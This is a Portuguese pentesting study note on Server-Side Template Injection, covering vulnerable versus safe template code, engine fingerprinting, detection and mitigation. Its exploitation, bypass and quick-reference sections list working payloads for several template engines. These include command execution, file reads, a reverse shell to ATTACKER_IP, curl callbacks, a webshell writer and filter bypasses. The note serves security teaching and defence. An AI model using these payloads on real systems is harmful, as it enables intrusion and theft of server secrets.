---
title: "SSTI"
---

# 02 - Server-Side Template Injection (SSTI)

> **Categoria**: Injeção no Servidor | **Severidade**: Crítica | **OWASP**: A03:2021

---

# O que é?

Template engines são bibliotecas de software que separam a **lógica de negócio** da
**apresentação** em aplicações web. Em vez de o desenvolvedor concatenar strings HTML manualmente
em código Python/PHP/Java, ele escreve um arquivo de template com marcadores especiais onde os
dados dinâmicos serão inseridos. O engine processa o template em tempo de execução, substitui os
marcadores pelos valores reais e entrega o HTML final ao navegador.

Essa separação é um princípio fundamental de boas práticas de desenvolvimento — templates podem
ser editados por designers sem conhecimento de programação, e a lógica backend permanece
encapsulada.

**Exemplos de template engines por linguagem:**

```
Python:
  Jinja2      - usado no Flask, Ansible, Salt
  Mako        - usado no Pyramid, SQLAlchemy docs
  Tornado     - template engine do framework Tornado
  Django DTL  - Django Template Language (mais restrito)
  Chameleon   - alternativa para Pyramid

PHP:
  Twig        - padrão do Symfony, Drupal 8+
  Smarty      - amplamente usado em CMSs legados
  Blade       - engine nativo do Laravel
  Plates      - alternativa simples sem compilação

Java:
  FreeMarker  - amplamente usado em aplicações enterprise Java
  Velocity    - parte do ecossistema Apache, usado em ERPs
  Thymeleaf   - integração nativa com Spring Boot
  Pebble      - inspirado no Twig, alternativa moderna

Ruby:
  ERB         - Embedded Ruby, padrão do Rails
  Haml        - sintaxe alternativa mais concisa
  Slim        - variante minimalista do Haml
  Liquid      - engine do Shopify (sandboxed por design)

Node.js:
  Pug (Jade)  - sintaxe baseada em indentação
  Handlebars  - lógica mínima, foco em separação
  EJS         - Embedded JavaScript, sintaxe similar ao ERB
  Nunjucks    - port do Jinja2 para JavaScript
  Mustache    - engine sem lógica, multi-linguagem
```

**SSTI (Server-Side Template Injection)** ocorre especificamente quando o **input do usuário é
inserido na STRING do template** — não como dado passado ao template, mas como parte do próprio
código de template — e o engine renderiza esse código como se fosse instrução legítima do
desenvolvedor.

A distinção é crítica:

```
CORRETO: o template é fixo, o dado é variável
  template = "Olá, {{ nome }}!"          <- string constante
  engine.render(template, nome=input)    <- input é dado, não código

VULNERAVEL: o template é construído com o input
  template = "Olá, " + input + "!"       <- template concatena input
  engine.render(template)                <- input é interpretado como código
```

A consequência direta de SSTI é que o atacante executa código no contexto do servidor com os
privilégios do processo web — tipicamente resultando em leitura de arquivos sensíveis, dump de
variáveis de ambiente (chaves de API, secrets JWT, credenciais de banco) e execução remota de
comandos (RCE).

---

# Onde é implementado?

Template engines estão presentes em praticamente toda aplicação web que gera HTML dinâmico.
Os cenários de risco são aqueles onde o **template em si pode ser influenciado por input externo**:

**E-commerce e plataformas de comunicação**
- Emails transacionais personalizados: "Olá {{nome}}, seu pedido #{{numero}} foi enviado"
- Notificações com dados do usuário inseridos em templates de mensagem
- Plataformas de email marketing onde usuários configuram templates de campanha
- Sistemas de fatura onde o layout do PDF é um template customizável

**CMS e blogs**
- Sistemas que permitem ao admin editar templates de página diretamente
- WordPress com plugins de template customizável (Elementor, Divi em alguns modos)
- Temas que aceitam shortcodes ou expressões processadas no servidor
- Wikis e plataformas de documentação com templates editáveis

**Ferramentas de relatório e BI**
- Relatórios configuráveis onde o usuário define o layout via template
- Exportadores de PDF/DOCX que usam template engine para montar o documento
- Dashboards onde admins podem personalizar mensagens de boas-vindas ou cabeçalhos

**Sistemas de notificação e automação**
- Webhooks com payload configurável pelo usuário
- Sistemas de alerta onde o formato da mensagem é editável
- Ferramentas de CI/CD com templates de mensagem de build configuráveis

**Construtores de landing page e funnelização**
- Ferramentas no-code/low-code que renderizam templates no backend
- Editores de landing page onde o usuário escreve conteúdo que é depois renderizado
- Sistemas de A/B testing com variantes de template dinâmicas

**Aplicações internas e ERPs**
- Formulários cujos valores são depois inseridos em templates de documento
- Sistemas de RH com cartas e contratos gerados por template engine
- Geradores de código que usam templates para scaffolding

---

# Como funciona de forma adequada?

O fluxo correto de uso de um template engine mantém uma separação rígida entre **template**
(código do desenvolvedor, fixo e controlado) e **dados** (input externo, variáveis de contexto).

**Diagrama do fluxo correto:**

```
  Dados do Usuário (input)
         |
         | nome = "Alice"
         | email = "alice@empresa.com"
         v
  +---------------------------+
  |  Lógica da aplicação      |   <- Python/PHP/Java
  |  (validação, sanitização) |
  +---------------------------+
         |
         | passa como variáveis de contexto
         v
  +---------------------------+        +---------------------------+
  |  Template Engine          |  <---  |  Template (arquivo fixo)  |
  |  (Jinja2, Twig, etc.)     |        |  "Ola, {{ nome }}!"       |
  +---------------------------+        |  definido pelo developer  |
         |                             +---------------------------+
         | renderiza substituindo {{ nome }} pelo valor da variável
         v
  +---------------------------+
  |  HTML final gerado:       |
  |  "Ola, Alice!"            |
  +---------------------------+
         |
         v
     Navegador do usuário
```

**Exemplo Jinja2 (Python/Flask) — correto vs. inseguro:**

```python
from flask import Flask, request, render_template, render_template_string
from jinja2 import Environment, select_autoescape

app = Flask(__name__)

# CORRETO: template em arquivo separado (templates/saudacao.html)
# O arquivo contém: <p>Bem-vindo, {{ nome }}!</p>
@app.route('/saudacao')
def saudacao_segura():
    nome = request.args.get('nome', 'Visitante')
    # render_template carrega arquivo fixo; nome entra como variável
    return render_template('saudacao.html', nome=nome)
    # Se nome = "{{config.SECRET_KEY}}", saida: "{{config.SECRET_KEY}}" literal

# INSEGURO: template construído com input do usuário
@app.route('/saudacao-insegura')
def saudacao_insegura():
    nome = request.args.get('nome', 'Visitante')
    # render_template_string avalia a string como template Jinja2
    return render_template_string(f'Bem-vindo, {nome}!')
    # Se nome = "{{config.SECRET_KEY}}", saida: valor real da SECRET_KEY
```

**Exemplo Twig (PHP/Symfony) — correto vs. inseguro:**

```php
// CORRETO: template em arquivo .twig separado
// O arquivo templates/email.html.twig contém: <p>Olá, {{ nome }}!</p>
class EmailController extends AbstractController
{
    public function enviarEmail(Request $request, Environment $twig): Response
    {
        $nome = $request->query->get('nome', 'Visitante');
        // render carrega template fixo; $nome entra como variável de contexto
        $html = $twig->render('email.html.twig', ['nome' => $nome]);
        return new Response($html);
        // Se $nome = "{{_self.env.getFilter('id')}}", exibe literal — seguro
    }
}

// INSEGURO: template criado dinamicamente com input do usuário
class EmailControllerInseguro extends AbstractController
{
    public function enviarEmail(Request $request, Environment $twig): Response
    {
        $nome = $request->query->get('nome', 'Visitante');
        // createTemplate compila a string como template Twig
        $template = $twig->createTemplate("Olá, " . $nome . "!");
        return new Response($template->render([]));
        // Se $nome = "{{_self.env.registerUndefinedFilterCallback('exec')}}
        //             {{_self.env.getFilter('id')}}"  -> executa id no servidor
    }
}
```

**Exemplo FreeMarker (Java/Spring) — correto vs. inseguro:**

```java
// CORRETO: template em arquivo .ftl separado
// O arquivo templates/saudacao.ftl contém: Bem-vindo, ${nome}!
@Controller
public class SaudacaoController {
    @Autowired
    private Configuration freemarkerConfig;

    @GetMapping("/saudacao")
    public String saudacao(@RequestParam String nome, Model model) {
        model.addAttribute("nome", nome);
        return "saudacao";  // carrega saudacao.ftl — template fixo
        // Se nome = "${7*7}", saida: "${7*7}" literal (não avaliado como contexto)
        // Nota: FreeMarker evalua ${} em templates .ftl, mas o valor de "nome"
        // é tratado como string, não como instrução do template
    }
}

// INSEGURO: template construído como string com input
@GetMapping("/saudacao-insegura")
public ResponseEntity<String> saudacaoInsegura(@RequestParam String nome) {
    try {
        Template t = new Template("test",
            new StringReader("Bem-vindo, " + nome + "!"),
            freemarkerConfig);
        StringWriter sw = new StringWriter();
        t.process(new HashMap<>(), sw);
        return ResponseEntity.ok(sw.toString());
        // Se nome = "<#assign ex='freemarker.template.utility.Execute'?new()>
        //            ${ex('id')}" -> executa id no servidor
    } catch (Exception e) {
        return ResponseEntity.status(500).body("Erro");
    }
}
```

**Sandboxing em Jinja2 — redução de superfície de ataque:**

```python
from jinja2.sandbox import SandboxedEnvironment
from jinja2 import select_autoescape

# SandboxedEnvironment restringe acesso a atributos perigosos
# Bloqueia acesso direto a __class__, __mro__, __subclasses__, etc.
env = SandboxedEnvironment(
    autoescape=select_autoescape(['html', 'xml'])
)

# Mesmo com sandbox, NUNCA inserir input do usuário na string do template
# O sandbox dificulta mas não elimina todos os vetores de escape
template = env.from_string("Olá, {{ nome }}!")   # template fixo
resultado = template.render(nome=user_input)       # input como dado
```

**Como template engines implementam auto-escaping para XSS:**

```
Sem auto-escaping:
  variavel = "<script>alert(1)</script>"
  template  = "{{ variavel }}"
  saida     = "<script>alert(1)</script>"  <- XSS no navegador

Com auto-escaping (Jinja2 autoescape=True):
  variavel = "<script>alert(1)</script>"
  template  = "{{ variavel }}"
  saida     = "&lt;script&gt;alert(1)&lt;/script&gt;"  <- seguro contra XSS

Por que SSTI é diferente do XSS:
  - XSS: HTML injetado e executado no NAVEGADOR do usuário
  - SSTI: código de template executado no SERVIDOR antes de qualquer HTML ser gerado
  - Auto-escaping não protege contra SSTI porque o código malicioso é executado
    antes do auto-escaping ser aplicado — o engine já avaliou a expressão
```

**Benefícios do padrão correto (template fixo + dados separados):**

```
+---------------------------------------------+
| Template fixo + variáveis de contexto:      |
|                                             |
| + Input do usuário tratado como string pura |
| + Engine nao interpreta delimitadores       |
|   {{ }} ${} <% %> presentes no input       |
| + Auto-escaping previne XSS                 |
| + Template pode ser auditado estaticamente  |
| + Mudancas de layout nao requerem deploys   |
|   (apenas editar o arquivo .html/.twig)     |
+---------------------------------------------+
```

---

## A Falha: Template Engine Processa Input do Usuário como Código de Template

SSTI acontece quando input do usuário é inserido diretamente na *string* do template antes de ser passado ao engine, em vez de ser passado como *variável* para dentro de um template pré-definido.

A suposição de design incorreta: o desenvolvedor pensa que está manipulando texto. O template engine pensa que está recebendo código a ser avaliado.

**Por que o desenvolvedor cria essa falha**: a forma "conveniente" de personalizar uma resposta é concatenar o input diretamente na string do template — `"Olá, " + username + "!"`. Isso parece inofensivo porque o desenvolvedor visualiza o resultado como texto. Mas o engine não vê texto: ele vê uma instrução de template que inclui expressões a serem avaliadas.

**A diferença que importa**:

```python
# VULNERÁVEL — input inserido diretamente na string do template
# O engine recebe: "Olá, {{7*7}}!" e avalia a expressão
template = Template("Olá, " + user_input + "!")
rendered = template.render()
# Se user_input = "{{7*7}}", resultado: "Olá, 49!"

# SEGURO — input passado como variável de contexto
# O engine substitui {{name}} pelo valor da variável, sem avaliar como código
template = Template("Olá, {{ name }}!")
rendered = template.render(name=user_input)
# Se user_input = "{{7*7}}", resultado: "Olá, {{7*7}}!"
```

No modelo seguro, o template é fixo e o input é tratado como dado puro. No modelo vulnerável, o template em si é construído com input do usuário — e o engine executa tudo que encontra entre os delimitadores, independente da origem.

**Consequência real**: um único campo vulnerável pode resultar em RCE com os privilégios do processo web — exfiltração de `SECRET_KEY`, tokens JWT, senhas de banco, acesso ao sistema operacional e movimento lateral na rede interna.

---

## Causa Raiz

Engines de template distinguem dois tipos de conteúdo:

1. **Texto estático** — impresso diretamente na saída
2. **Expressões de template** — avaliadas pelo engine e substituídas pelo resultado

Quando o desenvolvedor constrói a string do template com input do usuário, o engine não tem como saber qual parte é "código do desenvolvedor" e qual parte é "dado do usuário". Tudo que estiver entre os delimitadores será avaliado.

```python
# Exemplo concreto com Jinja2

# VULNERÁVEL
from jinja2 import Template
username = request.args.get('name')         # input: "{{config.SECRET_KEY}}"
t = Template("Bem-vindo, " + username + "!")
return t.render()
# Engine avalia {{config.SECRET_KEY}} e expõe a chave secreta na resposta

# SEGURO
from jinja2 import Template
username = request.args.get('name')
t = Template("Bem-vindo, {{ name }}!")
return t.render(name=username)
# O engine substitui {{name}} pelo valor da variável — não avalia como código
# Input "{{config.SECRET_KEY}}" seria exibido literalmente
```

```php
// Twig (PHP) — mesmo padrão

// VULNERÁVEL
$username = $_GET['name'];                  // input: "{{_self.env.getFilter("id")}}"
$template = $twig->createTemplate("Olá, " . $username . "!");
echo $template->render();

// SEGURO
$username = $_GET['name'];
$template = $twig->createTemplate("Olá, {{ name }}!");
echo $template->render(['name' => $username]);
```

O que está faltando: o template deve ser uma constante definida pelo desenvolvedor. O input do usuário deve entrar apenas como variável de contexto, nunca como parte da string do template.

---

## Como o Engine Interpreta Delimitadores no Input do Usuário

O engine processa dois tipos de conteúdo. Quando input do usuário é inserido diretamente na *string* do template, o engine interpreta os delimitadores de template como código a ser executado.

**Exemplo com Jinja2 (Python/Flask)**:

```
Template: "Bem-vindo, {{ name }}!"
Input legítimo: "Alice"    -> Saída: "Bem-vindo, Alice!"
Input malicioso: "{{7*7}}" -> Saída: "Bem-vindo, 49!"   <- SSTI confirmado
```

O engine avaliou `7*7` como expressão matemática, retornando `49`. Isso prova que código arbitrário pode ser executado no contexto do servidor.

---

## Identificação

### String de Detecção Inicial

Injete esta string universal para provocar erros em qualquer engine vulnerável:

```
${{<%[%'"}}%\.
```

Esta string contém delimitadores de todos os principais engines. Se a aplicação retornar um erro interno do servidor (500), é forte indicativo de SSTI.

### Árvore de Decisão ASCII para Identificar o Engine

```
Comece injetando: ${7*7}
                       |
         +-------------+-------------+
         |                           |
    Retorna 49                  Retorna ${7*7}
    (avaliado)                  (não avaliado)
         |                           |
   INJETAR: a{*comment*}b      INJETAR: {{7*7}}
         |                           |
   +-----+-----+             +-------+--------+
   |           |             |                |
Smarty       Mako        Retorna 49     Não retorna 49
(PHP)      (Python)      (avaliado)    (não vulnerável)
                              |
                        INJETAR: {{7*'7'}}
                              |
                    +---------+---------+
                    |                   |
               7777777                 49
              Twig (PHP)           Jinja2 (Python)

OUTROS ENGINES (testar separadamente):
  <%= 7*7 %>  -> 49   = ERB (Ruby)
  #{7*7}      -> 49   = Pebble / Mako
  *{7*7}      -> 49   = Thymeleaf (Java)
  ${7*7}      -> 49   = FreeMarker / Expression Language (Java)
```

### Payloads de Detecção por Engine

| Payload          | Resultado Esperado | Engine Identificado        |
|------------------|--------------------|----------------------------|
| `{{7*7}}`        | `49`               | Jinja2, Twig               |
| `{{7*'7'}}`      | `7777777`          | Twig (PHP)                 |
| `{{7*'7'}}`      | `49`               | Jinja2 (Python)            |
| `${7*7}`         | `49`               | FreeMarker, EL (Java)      |
| `<%= 7*7 %>`     | `49`               | ERB (Ruby)                 |
| `#{7*7}`         | `49`               | Pebble, Mako               |
| `*{7*7}`         | `49`               | Thymeleaf (Java)           |
| `{{ config }}`   | dict com configs   | Jinja2/Flask               |
| `{{ _self }}`    | objeto template    | Twig                       |

### Locais Comuns de Injeção

- Campo de nome/username (ex: "Olá, {{nome}}!")
- Template de email com nome do usuário
- Barra de busca refletida na página de resultados
- Nome de arquivo enviado por upload
- Campos de perfil (bio, descrição, assinatura)
- Headers HTTP refletidos (User-Agent, X-Forwarded-For)
- Parâmetros de URL refletidos no HTML da resposta

---

## Exploitation

### Jinja2 (Python / Flask / Django)

#### Reconhecimento - Dump de Configuração

```
{{ config.items() }}
{{ config.__class__.__init__.__globals__ }}
{{ self.__init__.__globals__ }}
```

#### Dump de Builtins

```
{{ self.__init__.__globals__.__builtins__ }}
```

#### Leitura de Arquivo Local (LFI)

```
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

#### RCE - Método 1: Via objeto config (Flask)

```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

#### RCE - Método 2: Via request (Flask)

```
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### RCE - Método 3: Via cycler/joiner/namespace (Sandbox Escape)

Objetos globais do Jinja2 que podem ser usados em ambientes com sandbox:

```
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

#### RCE - Método 4: Travessia MRO (Method Resolution Order)

O método consiste em navegar pela hierarquia de classes Python para encontrar `subprocess.Popen`:

```
# Passo 1: Listar todas as subclasses de object
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Procure na lista por `subprocess.Popen` e anote o índice (exemplo: 258):

```
# Passo 2: Executar comando via Popen
{{ ''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0].decode() }}
```

Substitua `258` pelo índice correto encontrado na listagem da sua aplicação alvo.

#### Reverse Shell via Jinja2

```
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

---

### Twig (PHP)

#### Reconhecimento

```
{{ _self }}
{{ _self.env }}
{{ 7 * 7 }}
```

#### LFI via Symfony file_excerpt

```
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

#### RCE - Método 1: registerUndefinedFilterCallback

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

#### RCE - Método 2: filter com system

```
{{["id"]|filter("system")}}
{{["id","arg1"]|filter("system")}}
```

#### RCE - Método 3: filter com passthru

```
{{["id"]|filter("passthru")}}
```

---

### ERB (Ruby on Rails)

#### Reconhecimento

```erb
<%= 7*7 %>
<%= "hello" %>
```

#### LFI

```erb
<%= File.open('/etc/passwd').read %>
<%= IO.read('/etc/passwd') %>
```

#### RCE

```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

---

### FreeMarker (Java)

#### Reconhecimento

```
${7*7}
${"freemarker.version"?eval}
```

#### RCE via Execute

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### RCE via ClassAPI

```
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign owc=classLoader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classLoader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

### Velocity (Java)

#### Reconhecimento

```
#set($x = 7 * 7)
${x}
```

#### RCE

```
#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($chr=$x.class.forName("java.lang.Character"))
#set($str=$x.class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

### Smarty (PHP)

#### Reconhecimento

```
{$smarty.version}
{php}echo "test";{/php}
```

#### RCE - Método 1: Tag php (Smarty < 3.1.30)

```
{php}echo system('id');{/php}
```

#### RCE - Método 2: WriteFile (escreve webshell)

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

#### RCE - Método 3: math com system

```
{math equation="system('id')"}
```

---

### Pebble (Java)

#### Reconhecimento

```
{{ 1 + 1 }}
{{ "test" }}
```

#### RCE via Runtime

```
{% set cmd = "id" %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(" ")) %}
{% set output = (1).TYPE.forName('java.io.InputStream').methods[2].invoke(bytes) %}
{{ output }}
```

---

### Mako (Python)

#### Reconhecimento

```
${7*7}
${"mako"}
```

#### RCE

```
${__import__('os').popen('id').read()}
<%
import os
x=os.popen('id').read()
%>
${x}
```

---

## Bypass de Proteções

### Bypass de Blacklist de Caracteres

#### Contornar bloqueio de underscore e ponto

```python
# Usando |attr() do Jinja2 com hex encoding
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}

# Usando request para passar strings bloqueadas como parâmetro GET
{{ ()|attr(request.args.c) }}?c=__class__
```

#### Contornar bloqueio de chaves duplas `{{ }}`

```python
# Usando blocos condicionais
{% if config.__class__.__init__.__globals__['os'].popen('id').read() %}ok{% endif %}

# Usando format string
{{'%s'|format(config)}}
```

#### Bypass via concatenação de strings

```python
# Concatenar nome de atributo
{{ ''['__cla'+'ss__'] }}

# Usar chr() para construir strings proibidas
{{ ''[request.args.a1]|attr(request.args.a2) }}&a1=__class__&a2=__mro__
```

#### Bypass de WAF sem espaços

```python
{{config.items()}}
{{(config)['SECRET_KEY']}}
{{config['SECRET_KEY']}}
```

### Contornar Sandbox Jinja2

```python
# Listar todos os subclasses para encontrar Popen
{{ ''.__class__.__mro__[1].__subclasses__() | join('\n') }}

# Buscar classe específica pelo nome usando loop
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('id',shell=True,stdout=-1).communicate()[0].decode() }}{% endif %}{% endfor %}
```

### Bypass via `attr()` Filter — Filtro de `.__` (AWAE Ch.8 — ERPNext)

Cenário: WAF ou filtro da aplicação bloqueia a string `.__` nos inputs de template Jinja2, impedindo notação de ponto para acessar dunder attributes.

**Solução**: o filtro nativo Jinja2 `attr(name)` acessa atributos passando o nome como string — sem usar notação ponto. Combinado com `{% set %}` para armazenar nomes de dunders, permite construir a cadeia completa de RCE sem `.__` em nenhum momento.

```python
{% set class = "__class__" %}
{% set mro   = "__mro__" %}
{% set sub   = "__subclasses__" %}
{% set gi    = "__globals__" %}
{% set ii    = "__init__" %}

{# cadeia equivalente a ''.__class__.__mro__[1].__subclasses__() #}
{{ ''|attr(class)|attr(mro)|attr(gi)|attr(sub)() }}

{# versão completa para RCE via os.popen #}
{% set base = ''|attr(class)|attr(mro)|list %}
{{ base[1]|attr(sub)()[INDICE]('id',shell=True,stdout=-1).communicate()[0].decode() }}
```

Identificar o índice correto da classe (subprocess.Popen, os._wrap_close):
```python
{# listar subclasses como string para buscar pelo nome #}
{{ ''|attr(class)|attr(mro)|list|last|attr(sub)()|join('\n') }}
```

Caso real: **ERPNext** (AWAE Ch.8) filtrava substring `".__"` literalmente. O bypass com `attr()` contornou o filtro sem alterar a lógica da cadeia.

---

### SSTI Cego (Blind SSTI)

Quando o output não é refletido na resposta, usar técnicas out-of-band:

#### Time-based (Jinja2) — cause delay perceptível

```python
# Loop pesado para causar delay
{{ range(99999999).__class__.__mro__[1].__subclasses__()[258]('sleep 5',shell=True,stdout=-1).communicate() }}
```

#### DNS / HTTP Callback (Jinja2)

```python
# Confirma execução via interactsh ou Burp Collaborator
{{ config.__class__.__init__.__globals__['os'].popen('curl http://ATTACKER.oast.fun/`id`').read() }}
```

#### DNS / HTTP Callback (Twig)

```
{{["curl http://ATTACKER.oast.fun/`id`"]|filter("system")}}
```

#### DNS / HTTP Callback (ERB)

```erb
<%= system("curl http://ATTACKER.oast.fun/`id`") %>
```

### SSTI em Contextos Específicos

#### Via nome de arquivo (upload)

Nomeie o arquivo com payload e faça upload. Se o servidor renderizar o nome:

```
{{7*7}}.jpg
${7*7}.jpg
```

#### Via header HTTP

```bash
curl -H "X-Forwarded-For: {{7*7}}" https://alvo.com/
curl -H "User-Agent: {{7*7}}" https://alvo.com/
```

### Exfiltração de Dados Sensíveis (Jinja2/Flask)

```python
# Dump de todas as configurações (inclui SECRET_KEY)
{{ config.items() }}

# Variáveis de ambiente do processo
{{ config.__class__.__init__.__globals__['os'].environ }}

# Listar arquivos do diretório atual
{{ config.__class__.__init__.__globals__['os'].listdir('.') }}
```

---

## Ferramentas

### SSTImap (Recomendado - Python3)

```bash
# Instalação
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt

# Detecção automática de SSTI e engine
python3 sstimap.py -u "http://alvo.com/index.php?name=test"

# Executar comando no sistema
python3 sstimap.py -u "http://alvo.com/index.php?name=test" -S id

# Baixar arquivo remoto para máquina local
python3 sstimap.py -u "http://alvo.com/index.php?name=test" -D '/etc/passwd' './passwd_local'

# Obter shell interativo
python3 sstimap.py -u "http://alvo.com/index.php?name=test" --os-shell

# Forçar engine específico
python3 sstimap.py -u "http://alvo.com/index.php?name=test" -t Jinja2

# Via POST
python3 sstimap.py -u "http://alvo.com/" -X POST -d "name=test"
```

Output esperado do SSTImap:

```
[+] SSTImap identified the following injection point:
  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

### tplmap (Python2 - legado)

```bash
python2 tplmap.py -u "http://alvo.com/?name=test"
python2 tplmap.py -u "http://alvo.com/?name=*"  # asterisco marca o ponto de injeção
python2 tplmap.py -u "http://alvo.com/?name=test" --os-shell
python2 tplmap.py -u "http://alvo.com/?name=test" --os-cmd "id"
```

### Burp Suite

- Scanner automático (Pro) detecta SSTI em muitos engines
- No Intruder, usar listas de payloads SSTI do SecLists:
  `/usr/share/seclists/Fuzzing/template-injection.txt`
- Fuzz todos os parâmetros com o payload universal: `${{<%[%'"}}%\.`
- No Repeater, testar payloads manualmente seguindo a árvore de decisão

### Recursos Externos

- PayloadsAllTheThings SSTI: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection`
- HackTricks SSTI: `https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`

---

## Detecção e Mitigação

### Padrões Suspeitos nos Logs de Acesso

```
# FreeMarker / Expression Language
\$\{.*\}

# Jinja2 / Twig / Handlebars
\{\{.*\}\}

# ERB (Ruby)
<%.*%>

# Pebble / Mako
#\{.*\}

# Thymeleaf
\*\{.*\}

# Strings de detecção clássicas a monitorar
${{<%[%'"}}%\.
{{7*7}}
${7*7}
{{config}}
{{_self}}
```

### Monitoramento de Comportamento Anômalo

- Processos filhos inesperados do servidor web (`www-data`, `apache`, `nginx` executando `id`, `whoami`, `curl`)
- Conexões de rede de saída inesperadas a partir do processo web
- Acesso a arquivos sensíveis por processos web (`/etc/passwd`, `.env`, `config.py`, `settings.py`)
- Erros 500 repetidos em resposta a inputs com caracteres especiais de template

### Mitigação

1. **Nunca inserir input do usuário diretamente na string do template** — sempre passe como variável
2. **Usar engines com sandbox** habilitada por padrão
3. **Whitelist de caracteres** nos campos de input quando possível
4. **WAF com regras SSTI** (ModSecurity CRS, AWS WAF managed rules)
5. **Execução em container isolado** com sistema de arquivos read-only
6. **Principle of Least Privilege** — processo web sem permissão de execução de comandos OS

```python
# Flask/Jinja2: ambiente com sandbox
from jinja2 import Environment, select_autoescape, sandbox

env = sandbox.SandboxedEnvironment(
    autoescape=select_autoescape(['html', 'xml'])
)
```

---

## Referência Rápida de Payloads

```
# DETECÇÃO UNIVERSAL
${{<%[%'"}}%\.

# Jinja2 - Detecção
{{7*7}}
{{config}}
{{config.items()}}

# Jinja2 - RCE (vários métodos)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}

# Twig - Detecção
{{_self}}
{{7*7}}

# Twig - RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{["id"]|filter("system")}}
{{["id"]|filter("passthru")}}

# ERB - Detecção + RCE
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>

# FreeMarker - Detecção + RCE
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Velocity - RCE
#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))

# Smarty - RCE
{php}echo system('id');{/php}
{math equation="system('id')"}

# Mako - RCE
${__import__('os').popen('id').read()}

# Pebble - RCE
{% set cmd = "id" %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(" ")) %}
```

---

## Módulos Relacionados

SSTI e Command Injection chegam à mesma consequência (RCE) por mecanismos distintos: em SSTI o código percorre o engine de template antes de atingir o runtime, enquanto em Command Injection o input chega diretamente ao shell do OS. A relação com XSS é de superfície de ataque: ambos exploram renderização de input sem escape, mas SSTI compromete o servidor e XSS compromete o navegador da vítima. Quando SSTI é explorado para leitura de arquivos locais, o impacto converge com LFI — ambos resultam em leitura arbitrária do sistema de arquivos por mecanismos diferentes. Referências normativas: OWASP Top 10 A03:2021 — Injection; CWE-94: Improper Control of Generation of Code (Code Injection).
